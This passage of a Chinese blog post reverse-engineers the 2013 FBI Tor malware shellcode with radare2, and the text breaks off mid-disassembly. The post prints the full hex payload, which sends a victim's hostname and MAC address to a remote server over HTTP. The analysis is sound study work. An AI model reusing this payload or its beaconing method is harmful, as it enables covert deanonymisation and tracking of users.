webpackJsonp([67,193],{556:function(n,x){n.exports={rawContent:'\n\n感想：\n\n先说说，逆向真累，得一点点跟着函数流前进探索。靠反汇编引擎可不靠谱，跟着流程才是王道啊。\n\n注释真是非常重要，为何要用IDA真是一目了然啊\n\n来源：\n\n- [Analysis of the FBI Tor Malware](http://ghowen.me/fbi-tor-malware-analysis/)\n- [Virustotal](https://www.virustotal.com/en/file/74414c3397dc0de10fbe0adedb7f033028fe4bb57ac4f51784a6df1a7b0114f0/analysis/)\n- [Freedom Hosting FBI Shellcode Payload..](http://pastebin.com/aFUP2gLB)\n- [Re:"Remembering \'08" Remembering Tor](http://www.blizzhackers.cc/viewtopic.php?f=52&t=496643&start=15)\n- [redirector](http://pastebin.com/K61QZpzb)\n- [infector](http://pastebin.com/GZ1Kg3cb)\n- [shellcode](http://pastebin.com/gVna4pi2)\n\nTor是一个让人们不被追踪地浏览网页和获取服务的匿名网络。作为这个网络的一部分，存在所谓的“[暗网](http://www.zhihu.com/question/22759179)”。这些网络只能通过Tor连接。虽然很多服务是无辜的或者抵制人权滥用，网络的匿名性也吸引了有目的的犯罪比如儿童色情。法律机构[无法](http://en.wikipedia.org/wiki/Tor\\_(anonymity_network)#Hidden\\_services)追踪到源IP地址。\n\n2013年，在Freedom Hosting的暗网服务器上发现了一个恶意程序，该程序挖掘特定浏览器的漏洞并在用户计算机上执行程序。该程序搜集用户信息并发送到Virginia的服务器，然后使浏览器崩溃。它没有明显的恶意程序特征。因此有猜测这个程序是在Virginia有办公室的的FBI制作的。FBI[有权编写恶意程序](http://en.wikipedia.org/wiki/Computer_and_Internet_Protocol_Address_Verifier)。看起来这个猜测是[真的](http://www.wired.com/threatlevel/2013/09/freedom-hosting-fbi/)。现在已经确认为FBI代号为[ EgotisticalGiraffe](http://cryptome.org/2013/10/nsa-egotisticalgiraffe.pdf)的作品。\n\n## 逆向之\n\n### 漏洞挖掘程序\n\n漏洞挖掘程序是javascript写的，挖掘了一个特定版本firefox的已知bug。挖掘程序经过充分混淆但是快速扫描能找到很长的16进制字符串，在前几个字符能明显看到操作符(通常在shellcode开头有jmp或者call，知道这一点就很容易找到shellcode了)。\n\n首先，攻击者在网页中嵌入了一个链接向恶意页面的`iframe`，将受害者定向到感染页面。参见这里[Freedom Hosting FBI IFRAME Redirector Malware Script](http://pastebin.com/bu2Ya0n6)。\n\n在受害者被重定向到真正的感染页面后，在三个iframe之间执行js，进一步混淆执行流程。最终触发漏洞，注入shellcode。参见[Freedom Hosting FBI Malware Infector (ForPayload) JavaScript](http://pastebin.com/RTwsyrH8)\n\njs那部分就不说了，我们看看shellcode。\n\n### 位置独立代码\n\nshellcode必须直接注入进程运行。它不知道自己会被注入到什么位置，也不知道Windows API函数的地址。\n\n因此，必须想些办法获取这些信息。FBI的这个程序使用了一个找到地址的常用方法：\n\n    call start\n    start:\n    pop ebp\n\n`call start`做了两件事，首先，把下一个要执行的指令的地址即`pop ebp`的地址压入栈，然后跳转到`start`标签位置，就是继续执行`pop ebp`。再执行完`pop ebp`后，`pop ebp`的地址就存入了`ebp`寄存器。以此为标准就能获取shellcode中的其它数据。\n\n### 定位Windows API\n\n译者：啊啊啊啊啊，都忘记这部分怎么回事了。大家可以看看\n\n- [Project shellcode上的教程](http://projectshellcode.com/?q=node/12)。\n- 有本专讲win32 shellcode的书[Understanding Windows Shellcode](nologin.org/Downloads/Papers/win32-shellcode.pdf)\n- [The Art of Win32 Shellcoding](http://www.codeproject.com/Articles/325776/The-Art-of-Win-Shellcoding)\n\n应用程序知道Windows载入的API在哪里，但shellcode不会知道。常见方法是查看`fs`寄存器指向的[线程信息块(TIB)](http://en.wikipedia.org/wiki/Win32_Thread_Information_Block).通过这个结构可以定位宿主程序DLL函数的位置，遍历DLL导出表知道找到函数。此过程非常无聊，所以FBI都使用了Metasploit项目[Stephen Fewer的函数解析器](https://github.com/iagox86/nbtool/blob/master/samples/shellcode-win32/block_api.asm)。\n\n    push arguments\n    ...\n    push FUNCTIONHASH\n    call Stephen的解析器\n\n函数哈希通过对函数名简单的哈希算法实现，你可以用别人做好的[哈希表](http://scriptjunkie1.110mb.com/hashes/index.html),可以用别人的哈希计算[程序](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/hash.py)，甚至[自己在shellcode中计算](http://projectshellcode.com/node/21)。\n\n## 开始\n\n首先先获取shellcode吧，把以下一堆hex保存到`input.txt`里\n\n    60FCE88A0000006089E531D2648B52308B520C8B52148B72280FB74A2631FF31C0AC3C617C022C20C1CF0D01C7E2F052578B52108B423C01D08B407885C0744A01D0508B48188B582001D3E33C498B348B01D631FF31C0ACC1CF0D01C738E075F4037DF83B7D2475E2588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE0585F5A8B12EB86055D81BDE90200004745542075708D85D102000050684C772607FFD585C0745E8D85D802000050684C772607FFD585C0744CBB9001000029DC54536829806B00FFD501DC85C07536505050504050405068EA0FDFE0FFD531DBF7D339C3741F89C36A108DB5E102000056536899A57461FFD585C0741FFE8D8900000075E380BD4F020000017407E83B010000EB05E84D010000FFE7B80001000029C489E252505268B649DE01FFD55F81C40001000085C00F85F200000057E8F90000005E89CA8DBDE9020000E8EB0000004F83FA207C05BA2000000089D156F3A4B90D0000008DB5C4020000F3A489BD4B0200005E5668A9283480FFD585C00F84AA000000668B480A6683F9040F829C0000008D400C8B008B088B09B8000100005089E729C489E657565151684872D2B8FFD585C081C4040100000FB70F83F906726CB906000000B81000000029C489E789CAD1E2505231D28A1688D024F0C0E8043C0977040430EB02043788074788D0240F3C0977040430EB02043788074746E2D45929CF89FE5801C48BBD4B020000F3A4C6854F02000001E82E00000031C0505129CF4F575368C2EB385FFFD55368756E4D61FFD5E9C8FEFFFF31C9F7D131C0F2AEF7D149C300000000008DBDE9020000E8E4FFFFFF4FB94F0000008DB575020000F3A48DBDE9020000E8CBFFFFFFC30D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A4163636570743A202A2F2A0D0A4163636570742D456E636F64696E673A20677A69700D0A0D0A0083C70E31C9F7D131C0F3AE4FFFE70D0A436F6F6B69653A2049443D7773325F3332004950484C50415049000200005041DECA36474554202F30356365613464652D393531642D343033372D626638662D66363930353562323739626220485454502F312E310D0A486F73743A200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000090\n\n然后使用`xxd`转化为二进制文件。\n\n    $ xxd -r -p hex_input.txt magneto.payload.shellcode\n    $ ls -al magneto.payload.shellcode\n    -rw-r--r-- 1 reverland reverland 956 Aug 14 19:29 magneto.payload.shellcode\n    $ sha256sum magneto.payload.shellcode\n    74414c3397dc0de10fbe0adedb7f033028fe4bb57ac4f51784a6df1a7b0114f0  magneto.payload.shellcode\n\n首先反汇编shellcode：\n\n     ~/Work/project/reverse/test ⮀ r2 -b 32 -k w32 -a x86 magneto.payload.shellcode\n     -- Everything up-to-date.\n    [0x00000000]> pD 956\n                0x00000000    60           pushad\n                0x00000001    fc           cld\n                0x00000002    e88a000000   call 0x91\n                   0x00000091(unk)\n                0x00000007    60           pushad\n                0x00000008    89e5         mov ebp, esp\n                0x0000000a    31d2         xor edx, edx\n                0x0000000c    648b5230     mov edx, [fs:edx+0x30]\n                0x00000010    8b520c       mov edx, [edx+0xc]\n                0x00000013    8b5214       mov edx, [edx+0x14]\n       .------> 0x00000016    8b7228       mov esi, [edx+0x28]\n       |        0x00000019    0fb74a26     movzx ecx, word [edx+0x26]\n       |        0x0000001d    31ff         xor edi, edi\n       |   .--> 0x0000001f    31c0         xor eax, eax\n       |   |    0x00000021    ac           lodsb\n       |   |    0x00000022    3c61         cmp al, 0x61\n       |   |,=< 0x00000024    7c02         jl 0x28\n       |   ||   0x00000026    2c20         sub al, 0x20\n       |   |`-> 0x00000028    c1cf0d       ror edi, 0xd\n       |   |    0x0000002b    01c7         add edi, eax\n       |   `==< 0x0000002d    e2f0         loop 0x1f\n       |        0x0000002f    52           push edx\n       |        0x00000030    57           push edi\n       |        0x00000031    8b5210       mov edx, [edx+0x10]\n       |        0x00000034    8b423c       mov eax, [edx+0x3c]\n       |        0x00000037    01d0         add eax, edx\n       |        0x00000039    8b4078       mov eax, [eax+0x78]\n       |        0x0000003c    85c0         test eax, eax\n       |  ,===< 0x0000003e    744a         je 0x8a\n       |  |     0x00000040    01d0         add eax, edx\n       |  |     0x00000042    50           push eax\n       |  |     0x00000043    8b4818       mov ecx, [eax+0x18]\n       |  |     0x00000046    8b5820       mov ebx, [eax+0x20]\n       |  |     0x00000049    01d3         add ebx, edx\n       |.-----> 0x0000004b    e33c         jecxz 0x89\n       || |     0x0000004d    49           dec ecx\n       || |     0x0000004e    8b348b       mov esi, [ebx+ecx*4]\n       || |     0x00000051    01d6         add esi, edx\n       || |     0x00000053    31ff         xor edi, edi\n       ||.----> 0x00000055    31c0         xor eax, eax\n       ||||     0x00000057    ac           lodsb\n       ||||     0x00000058    c1cf0d       ror edi, 0xd\n       ||||     0x0000005b    01c7         add edi, eax\n       ||||     0x0000005d    38e0         cmp al, ah\n       ||`====< 0x0000005f    75f4         jne 0x55\n       || |     0x00000061    037df8       add edi, [ebp-0x8]\n       || |     0x00000064    3b7d24       cmp edi, [ebp+0x24]\n       |`=====< 0x00000067    75e2         jne 0x4b\n       |  |     0x00000069    58           pop eax\n       |  |     0x0000006a    8b5824       mov ebx, [eax+0x24]\n       |  |     0x0000006d    01d3         add ebx, edx\n       |  |     0x0000006f    668b0c4b     mov cx, [ebx+ecx*2]\n       |  |     0x00000073    8b581c       mov ebx, [eax+0x1c]\n       |  |     0x00000076    01d3         add ebx, edx\n       |  |     0x00000078    8b048b       mov eax, [ebx+ecx*4]\n       |  |     0x0000007b    01d0         add eax, edx\n       |  |     0x0000007d    89442424     mov [esp+0x24], eax\n       |  |     0x00000081    5b           pop ebx\n       |  |     0x00000082    5b           pop ebx\n       |  |     0x00000083    61           popad\n       |  |     0x00000084    59           pop ecx\n       |  |     0x00000085    5a           pop edx\n       |  |     0x00000086    51           push ecx\n       |  |     0x00000087    ffe0         jmp eax\n       |  |     0x00000089    58           pop eax\n       |  `---> 0x0000008a    5f           pop edi\n       |        0x0000008b    5a           pop edx\n       |        0x0000008c    8b12         mov edx, [edx]\n       `======< 0x0000008e    eb86         jmp 0x16\n\n首先\n\n    pushad\n    cld\n\n将寄存器内容保存在堆栈上并清空寄存器内容。\n\n然后可以看到从`0x00000002`调用`0x00000091`。那从`0x00000007`开始是啥？参考之前stephen的函数解析器，一直到`0x0000008e`都是解析器。唉？`0x90`是啥？到`0x00000091`开始：\n\n    [0x00000000]> pD @0x91\n                0x00000091    5d           pop ebp\n                0x00000092    81bde902000. cmp dword [ebp+0x2e9], 0x20544547\n            ,=< 0x0000009c    7570         jne 0x10e\n            |   0x0000009e    8d85d1020000 lea eax, [ebp+0x2d1]\n            |   0x000000a4    50           push eax\n            |   0x000000a5    684c772607   push 0x726774c ;  0x0726774c \n            |   0x000000aa    ffd5         call ebp\n            |      0x00000000(unk, unk, unk, unk, unk, unk, unk, unk)\n            |   0x000000ac    85c0         test eax, eax\n           ,==< 0x000000ae    745e         je 0x10e\n           ||   0x000000b0    8d85d8020000 lea eax, [ebp+0x2d8]\n           ||   0x000000b6    50           push eax\n           ||   0x000000b7    684c772607   push 0x726774c ;  0x0726774c \n           ||   0x000000bc    ffd5         call ebp\n           ||      0x00000000(unk, unk)\n           ||   0x000000be    85c0         test eax, eax\n          ,===< 0x000000c0    744c         je 0x10e\n          |||   0x000000c2    bb90010000   mov ebx, 0x190 ;  0x00000190 \n          |||   0x000000c7    29dc         sub esp, ebx\n          |||   0x000000c9    54           push esp\n          |||   0x000000ca    53           push ebx\n          |||   0x000000cb    6829806b00   push 0x6b8029 ;  0x006b8029 \n          |||   0x000000d0    ffd5         call ebp\n          |||      0x00000000(unk, unk, unk)\n          |||   0x000000d2    01dc         add esp, ebx\n          |||   0x000000d4    85c0         test eax, eax\n         ,====< 0x000000d6    7536         jne 0x10e\n         ||||   0x000000d8    50           push eax\n         ||||   0x000000d9    50           push eax\n         ||||   0x000000da    50           push eax\n         ||||   0x000000db    50           push eax\n         ||||   0x000000dc    40           inc eax\n         ||||   0x000000dd    50           push eax\n         ||||   0x000000de    40           inc eax\n         ||||   0x000000df    50           push eax\n         ||||   0x000000e0    68ea0fdfe0   push 0xe0df0fea ;  0xe0df0fea \n         ||||   0x000000e5    ffd5         call ebp\n         ||||      0x00000000(unk, unk, unk, unk, unk, unk, unk)\n         ||||   0x000000e7    31db         xor ebx, ebx\n         ||||   0x000000e9    f7d3         not ebx\n         ||||   0x000000eb    39c3         cmp ebx, eax\n        ,=====< 0x000000ed    741f         je 0x10e\n        |||||   0x000000ef    89c3         mov ebx, eax\n      .-------> 0x000000f1    6a10         push 0x10 ;  0x00000010 \n      | |||||   0x000000f3    8db5e1020000 lea esi, [ebp+0x2e1]\n      | |||||   0x000000f9    56           push esi\n      | |||||   0x000000fa    53           push ebx\n      | |||||   0x000000fb    6899a57461   push 0x6174a599 ;  0x6174a599 \n      | |||||   0x00000100    ffd5         call ebp\n      | |||||      0x00000000(unk, unk, unk, unk)\n      | |||||   0x00000102    85c0         test eax, eax\n      |,======< 0x00000104    741f         je 0x125\n      |||||||   0x00000106    fe8d89000000 dec byte [ebp+0x89]\n      `=======< 0x0000010c    75e3         jne 0xf1\n       |`````-> 0x0000010e    80bd4f02000. cmp byte [ebp+0x24f], 0x1\n      ========< 0x00000115    7407         je 0x11e\n       |        0x00000117    e83b010000   call 0x257\n       |           0x00000257()\n      ========< 0x0000011c    eb05         jmp 0x123\n      --------> 0x0000011e    e84d010000   call 0x270\n              >    0x00000270()\n      --------> 0x00000123    ffe7         jmp edi\n       `------> 0x00000125    b800010000   mov eax, 0x100 ;  0x00000100 \n                0x0000012a    29c4         sub esp, eax\n                0x0000012c    89e2         mov edx, esp\n                0x0000012e    52           push edx\n                0x0000012f    50           push eax\n                0x00000130    52           push edx\n                0x00000131    68b649de01   push 0x1de49b6 ;  0x01de49b6 \n                0x00000136    ffd5         call ebp\n                   0x00000000(unk, unk, unk, unk)\n                0x00000138    5f           pop edi\n                0x00000139    81c400010000 add esp, 0x100\n                0x0000013f    85c0         test eax, eax\n      ========< 0x00000141    0f85f2000000 jne 0x239\n                0x00000147    57           push edi\n                0x00000148    e8f9000000   call 0x246\n                   0x00000246(unk)\n                0x0000014d    5e           pop esi\n                0x0000014e    89ca         mov edx, ecx\n                0x00000150    8dbde9020000 lea edi, [ebp+0x2e9]\n                0x00000156    e8eb000000   call 0x246\n                   0x00000246()\n                0x0000015b    4f           dec edi\n                0x0000015c    83fa20       cmp edx, 0x20\n      ========< 0x0000015f    7c05         jl 0x166\n                0x00000161    ba20000000   mov edx, 0x20 ;  0x00000020 \n      --------> 0x00000166    89d1         mov ecx, edx\n                0x00000168    56           push esi\n                0x00000169    f3a4         rep movsb\n                0x0000016b    b90d000000   mov ecx, 0xd ;  0x0000000d \n                0x00000170    8db5c4020000 lea esi, [ebp+0x2c4]\n                0x00000176    f3a4         rep movsb\n                0x00000178    89bd4b020000 mov [ebp+0x24b], edi\n                0x0000017e    5e           pop esi\n                0x0000017f    56           push esi\n                0x00000180    68a9283480   push 0x803428a9 ;  0x803428a9 \n                0x00000185    ffd5         call ebp\n\n首先`pop ebp`将解析器的地址弹入`ebp`，`ebp`就指向了所有解析器，显然，之后的一些长十六机制书就是windows API函数的哈希了。我们查查表、跟跟执行流程、看看四处的数据，做做注释，就知道大致怎么回事了。\n\n    [0x00000000]> ps @0x00000007+0x2e9\n    GET /05cea4de-951d-4037-bf8f-f69055b279bb HTTP/1.1\\x0d\n    Host:\n    [0x00000000]> ps @0x00000007+0x2d1\n    ws2_32\n    [0x00000000]> ps @0x00000007+0x2d8\n    IPHLPAPI\n\n当看到一大堆往`0x0000010e`的类似跳转，猜测大概是处理出错的函数吧，可以注释之。\n\n在函数调用之前(`0x0000092`)还有个自检查\n\n    cmp dword [ebp+0x2e9], 0x20544547\n    jne 0x10e\n\n我们可以看到是看`ebp+0x2e9`指向的是不是以`GET `开头：\n\n     ~ ⮀ print "\\x20\\x54\\x45\\x47"\n     TEG\n\n最后获得的是一个标准的shellcode建立socket流程:\n\n1. 通过`kernel.dll!LoadlibraryA`载入相应dll(`ws2_32`),这里还载入了`IPHLPAPI`\n2. `ws2_32.dll!WSAStartup`初始化socket\n3. `ws2_32.dll!WSASocketA`建立socket\n4. `ws2_32.dll!connect`连接socket\n\nconnect返回0时说明连接成功，那么可以知道`0x00000104`地方的`je 0x125`跳往的地方应该就是连接成功后要执行的位置了。可以注释下。\n\n注意之后的\n\n    0x00000106    fe8d89000000 dec byte [ebp+0x89]\n    0x0000010c    75e3         jne 0xf1\n\n`ebp+0x89=0x90`，这也是我发现不知道是什么的一个字节。根据紧随其后的一个跳转来看，是一个计数器，看样子是尝试连接5次\n\n    [0x00000090]> px 1@0x7+0x89\n    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n    0x00000090  05\n\n如果5次connect都失败了，没有跳转到`0x125`, 就到了`0x10e`，就是我们猜测是错误处理的部分。\n\n    [0x00000256]> pd 10@0x10e\n               0x0000010e    80bd4f02000. cmp byte [ebp+0x24f], 0x1\n           ,=< 0x00000115    7407         je 0x11e\n           |   0x00000117    e83b010000   call 0x257\n           |      0x00000257()\n          ,==< 0x0000011c    eb05         jmp 0x123\n          |`-> 0x0000011e    e84d010000   call 0x270\n          || >    0x00000270()\n          `--> 0x00000123    ffe7         jmp edi\n               0x00000125    b800010000   mov eax, 0x100 ;  0x00000100 \n               0x0000012a    29c4         sub esp, eax\n               0x0000012c    89e2         mov edx, esp\n               0x0000012e    52           push edx\n\n把`0x256`的字节和1做比较，相等则调用`0x270`再执行`0x123`，否则调用`0x257`然后再跳到`0x123`。\n\n不知道判断了什么。\n\n我们先看看`0x257`吧\n\n    [0x00000000]> pd 10@0x257\n               0x00000257    8dbde9020000 lea edi, [ebp+0x2e9]\n               0x0000025d    e8e4ffffff   call 0x246\n\n载入`0x7+0x2e9`然后调用`0x246`\n\n    [0x00000000]> ps @0x7+0x2e9\n    GET /05cea4de-951d-4037-bf8f-f69055b279bb HTTP/1.1\\x0d\n    Host: \n    \n    [0x00000000]> pd 10@0x246\n               0x00000246    31c9         xor ecx, ecx\n               0x00000248    f7d1         not ecx\n               0x0000024a    31c0         xor eax, eax\n               0x0000024c    f2ae         repne scasb\n               0x0000024e    f7d1         not ecx\n               0x00000250    49           dec ecx\n               0x00000251    c3           ret\n\n`0x246`，中`repne scasb`常常用来计算字符串长度。仔细看其实`0x246`就是`strlen`。计算结果在`ecx`中,`edi`此时指向字符串`\\0`下一个字节。\n\n所以回到`0x257`:\n\n    [0x00000000]> pd 10@0x257\n               0x00000257    8dbde9020000 lea edi, [ebp+0x2e9]\n               0x0000025d    e8e4ffffff   call 0x246\n                  0x00000246()\n               0x00000262    4f           dec edi\n               0x00000263    b94f000000   mov ecx, 0x4f ;  0x0000004f \n               0x00000268    8db575020000 lea esi, [ebp+0x275]\n               0x0000026e    f3a4         rep movsb\n               0x00000270    8dbde9020000 lea edi, [ebp+0x2e9]\n               0x00000276    e8cbffffff   call 0x246\n                  0x00000246()\n               0x0000027b    c3           ret\n\n首先`edi`减1指向字符串`\\0`位置。\n\n    [0x00000000]> ps @0x7+0x275\n    \\x0d\n    Connection: keep-alive\\x0d\n    Accept: */*\\x0d\n    Accept-Encoding: gzip\\x0d\n    \\x0d\n\n将两个字符串结合起来了。shellcode改变了自己，可以通过`ebp+0x2e9`获得新的HTTP报头.\n\n难道标志位不相等就构造报头？然后跳转到报头后下一位，我们稍微计算下发现跳转到一堆`00`上，崩掉了……\n\n    [0x00000000]> y 0x4f @0x7+0x275\n    [0x00000000]> e io.cache=true\n    [0x00000000]> yy 0x32a\n    [0x00000000]> px @0x32a\n    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n    0x0000032a  0d0a 436f 6e6e 6563 7469 6f6e 3a20 6b65  ..Connection: ke\n    0x0000033a  6570 2d61 6c69 7665 0d0a 4163 6365 7074  ep-alive..Accept\n    0x0000034a  3a20 2a2f 2a0d 0a41 6363 6570 742d 456e  : */*..Accept-En\n    0x0000035a  636f 6469 6e67 3a20 677a 6970 0d0a 0d0a  coding: gzip....\n    0x0000036a  0083 c70e 31c9 f7d1 31c0 f3ae 4fff e700  ....1...1...O...\n    0x0000037a  0000 0000 0000 0000 0000 0000 0000 0000  ................\n    0x0000038a  0000 0000 0000 0000 0000 0000 0000 0000  ................\n    0x0000039a  0000 0000 0000 0000 0000 0000 0000 0000  ................\n    0x000003aa  0000 0000 0000 0000 0000 0000 0000 0000  ................\n    0x000003ba  0090 ffff ffff ffff ffff ffff ffff ffff  ................\n\n回到`0x10e`，我们再看看`0x270`, 标志位为1发生什么。\n\n    [0x00000000]>  pd 3@0x270\n               0x00000270    8dbde9020000 lea edi, [ebp+0x2e9]\n               0x00000276    e8cbffffff   call 0x246\n                  0x00000246()\n               0x0000027b    c3           ret\n\n\n    [0x00000000]>  pd 6@0x10e\n               0x0000010e    80bd4f02000. cmp byte [ebp+0x24f], 0x1\n           ,=< 0x00000115    7407         je 0x11e\n           |   0x00000117    e83b010000   call 0x257\n           |      0x00000257(unk)\n          ,==< 0x0000011c    eb05         jmp 0x123\n          |`-> 0x0000011e    e84d010000   call 0x270\n          || >    0x00000270()\n          `--> 0x00000123    ffe7         jmp edi\n\n\n    [0x00000000]> pd 10@0x270\n               0x00000270    8dbde9020000 lea edi, [ebp+0x2e9]\n               0x00000276    e8cbffffff   call 0x246\n                  0x00000246()\n               0x0000027b    c3           ret\n\nWhat?计算下报头长度，然后直接跳过去崩掉……\n\n反正只要`connect`失败就崩了……只不过崩之前干的事情不同，不知道`ebp+0x24f`是判断啥的标志位。\n\nOk, 如果`connect`成功连接。\n\n    0x00000104    741f         je 0x125\n\n我们可以看到，从`0x125`就是`gethostname`了。\n\n    [0x00000000]> pd 10 @0x125\n               0x00000125    b800010000   mov eax, 0x100 ;  0x00000100 \n               0x0000012a    29c4         sub esp, eax\n               0x0000012c    89e2         mov edx, esp\n               0x0000012e    52           push edx\n               0x0000012f    50           push eax\n               0x00000130    52           push edx\n               0x00000131    68b649de01   push 0x1de49b6 ;  0x01de49b6 \n               0x00000136    ffd5         call ebp\n\n    exercise ● ⮀ python hash.py ws2_32.dll gethostname\n    [+] Ran on Sat Aug 16 20:23:44 2014\n    \n    [+] 0x01DE49B6 = ws2_32.dll!gethostname\n\n`gethostname`的结果写入`edi`中，接着判断如果失败跳到`0x239`去，不知道是啥。\n\n    [0x00000000]> pd 10@0x239\n           |   0x00000239    53           push ebx\n           |   0x0000023a    68756e4d61   push 0x614d6e75 ;  0x614d6e75 \n           |   0x0000023f    ffd5         call ebp\n           |      0x00000000(unk, unk, unk) ; name\n\n这个hash是`"ws2_32.dll!closesocket"`那么就很显然是关闭socket的函数了.\n\n我们回到之前`gethostname`地方：\n\n            ,=< 0x00000141    0f85f2000000 jne 0x239\n           |   0x00000147    57           push edi\n           |   0x00000148    e8f9000000   call 0x246\n           |      0x00000246(unk) ; strlen\n           |   0x0000014d    5e           pop esi\n           |   0x0000014e    89ca         mov edx, ecx\n           |   0x00000150    8dbde9020000 lea edi, [ebp+0x2e9]\n           |   0x00000156    e8eb000000   call 0x246\n           |      0x00000246() ; strlen\n           |   0x0000015b    4f           dec edi\n           |   0x0000015c    83fa20       cmp edx, 0x20\n          ,==< 0x0000015f    7c05         jl 0x166\n\n接下来，又是计算字符串长度，判断之前`gethostname`结果是否等于32,如果比32小则跳转到`0x166`, 如果大于32则将edx设置成32。而`0x166`开始又是之前我们分析过的拼接字符串的部分。\n\n    [0x00000246]> pd 7@0x166\n               0x00000166    89d1         mov ecx, edx\n               0x00000168    56           push esi\n               0x00000169    f3a4         rep movsb\n               0x0000016b    b90d000000   mov ecx, 0xd ;  0x0000000d \n               0x00000170    8db5c4020000 lea esi, [ebp+0x2c4]\n               0x00000176    f3a4         rep movsb\n               0x00000178    89bd4b020000 mov [ebp+0x24b], edi\n\n就是把`gethostname`的结果拼接到`HOST`字段上。\n\n    [0x00000246]> ps @0x7+0x2c4\n    \\x0d\n    Cookie: ID=ws2_32\n    [0x00000246]> ps @0x7+0x2e9\n    GET /05cea4de-951d-4037-bf8f-f69055b279bb HTTP/1.1\\x0d\n    Host: \n\n同时`gethostname`获取的结果保存到堆栈上，最后弹出，调用`gethostbyname`。\n\n    [0x00000246]> pd 10@0x179\n               0x00000179    bd4b020000   mov ebp, 0x24b ;  0x0000024b \n               0x0000017e    5e           pop esi\n               0x0000017f    56           push esi\n               0x00000180    68a9283480   push 0x803428a9 ;  0x803428a9 \n               0x00000185    ffd5         call ebp\n                  0x00000000(unk, unk) ; name\n               0x00000187    85c0         test eax, eax\n\n    % python hash.py ws2_32.dll gethostbyname\n    [+] Ran on Tue Aug 19 16:16:21 2014\n    \n    [+] 0x803428A9 = ws2_32.dll!gethostbyname\n    \n两次检查结果确认返回了正确的结果，\n\n紧接着，准备数据，调用`sendARP`获取mac地址\n\n    % python hash.py iphlpapi.dll SendARP             \n    [+] Ran on Tue Aug 19 16:21:37 2014\n    \n    [+] 0xB8D27248 = iphlpapi.dll!SendARP\n\n\n      ||   0x0000019d    8d400c       lea eax, [eax+0xc]\n      ||   0x000001a0    8b00         mov eax, [eax]\n      ||   0x000001a2    8b08         mov ecx, [eax]\n      ||   0x000001a4    8b09         mov ecx, [ecx]\n      ||   0x000001a6    b800010000   mov eax, 0x100 ;  0x00000100 \n      ||   0x000001ab    50           push eax\n      ||   0x000001ac    89e7         mov edi, esp\n      ||   0x000001ae    29c4         sub esp, eax\n      ||   0x000001b0    89e6         mov esi, esp\n      ||   0x000001b2    57           push edi\n      ||   0x000001b3    56           push esi\n      ||   0x000001b4    51           push ecx\n      ||   0x000001b5    51           push ecx\n      ||   0x000001b6    684872d2b8   push 0xb8d27248 ;  sendARP \n      ||   0x000001bb    ffd5         call ebp\n\n根据msdn上看到的，`edi`指向mac地址的长度。接下来比较mac地址是否是六个字节，如果不是……我们之前看到了0x239是`closesocket`\n\n    [0x00000000]> pd 10@0x1bf\n               0x000001bf    81c404010000 add esp, 0x104\n               0x000001c5    0fb70f       movzx ecx, word [edi]\n               0x000001c8    83f906       cmp ecx, 0x6\n           ,=< 0x000001cb    726c         jb 0x239\n\n接下来这个乍一看让人困惑，在栈上分配空间，还干了一堆不知道干什么的。\n\n    [0x00000000]> pd 32@0x1cd\n    |          0x000001cd    b906000000   mov ecx, 0x6 ;  0x00000006 \n    |          0x000001d2    b810000000   mov eax, 0x10 ;  0x00000010 \n    |          0x000001d7    29c4         sub esp, eax\n    |          0x000001d9    89e7         mov edi, esp\n    |          0x000001db    89ca         mov edx, ecx\n    |          0x000001dd    d1e2         shl edx, 1\n    |          0x000001df    50           push eax\n    |          0x000001e0    52           push edx\n    |          ; JMP XREF from 0x0000020b (fcn.00000090)\n    |  .-----> 0x000001e1    31d2         xor edx, edx\n    |  |       0x000001e3    8a16         mov dl, [esi]\n    |  |       0x000001e5    88d0         mov al, dl\n    |  |       0x000001e7    24f0         and al, 0xf0\n    |  |       0x000001e9    c0e804       shr al, 0x4\n    |  |       0x000001ec    3c09         cmp al, 0x9\n    |  |   ,=< 0x000001ee    7704         ja 0x1f4\n    |  |   |   0x000001f0    0430         add al, 0x30\n    |  |  ,==< 0x000001f2    eb02         jmp 0x1f6 ; (fcn.00000090)\n    |  |  ||   ; JMP XREF from 0x000001ee (fcn.00000090)\n    |  |  |`-> 0x000001f4    0437         add al, 0x37\n    |  |  |    ; JMP XREF from 0x000001f2 (fcn.00000090)\n    |  |  `--> 0x000001f6    8807         mov [edi], al\n    |  |       0x000001f8    47           inc edi\n    |  |       0x000001f9    88d0         mov al, dl\n    |  |       0x000001fb    240f         and al, 0xf\n    |  |       0x000001fd    3c09         cmp al, 0x9\n    |  | ,===< 0x000001ff    7704         ja 0x205\n    |  | |     0x00000201    0430         add al, 0x30\n    |  |,====< 0x00000203    eb02         jmp 0x207 ; (fcn.00000090)\n    |  |||     ; JMP XREF from 0x000001ff (fcn.00000090)\n    |  ||`---> 0x00000205    0437         add al, 0x37\n    |  ||      ; JMP XREF from 0x00000203 (fcn.00000090)\n    |  |`----> 0x00000207    8807         mov [edi], al\n    |  |       0x00000209    47           inc edi\n    |  |       0x0000020a    46           inc esi\n    |  `=====< 0x0000020b    e2d4         loop 0x1e1\n    |          0x0000020d    59           pop ecx\n\n后来看看原来如此\n\n    In [9]: chr(10+0x37)\n    Out[9]: \'A\'\n    \n    In [10]: chr(9+0x30)\n    Out[10]: \'9\'\n\n原来是把mac地址转换成可打印字符。\n\n下一步，估计就是放进http报头中发送了。\n\n    [0x00000000]> pd 10@0x0000020d\n    |          0x0000020d    59           pop ecx\n    |          0x0000020e    29cf         sub edi, ecx\n    |          0x00000210    89fe         mov esi, edi\n    |          0x00000212    58           pop eax\n    |          0x00000213    01c4         add esp, eax\n    |          0x00000215    8bbd4b020000 mov edi, [ebp+0x24b]\n    |          0x0000021b    f3a4         rep movsb\n    |          0x0000021d    c6854f02000. mov byte [ebp+0x24f], 0x1 ;  0x00000001 \n    |          0x00000224    e82e000000   call 0x257 ; (fcn.00000252)\n    |             fcn.00000252()\n    |          0x00000229    31c0         xor eax, eax\n\n果然是，调用`0x257`拼接报头。\n\n之后，\n\n    [0x00000252]> pd 10@0x00000229\n    |          0x00000229    31c0         xor eax, eax\n    |          0x0000022b    50           push eax\n    |          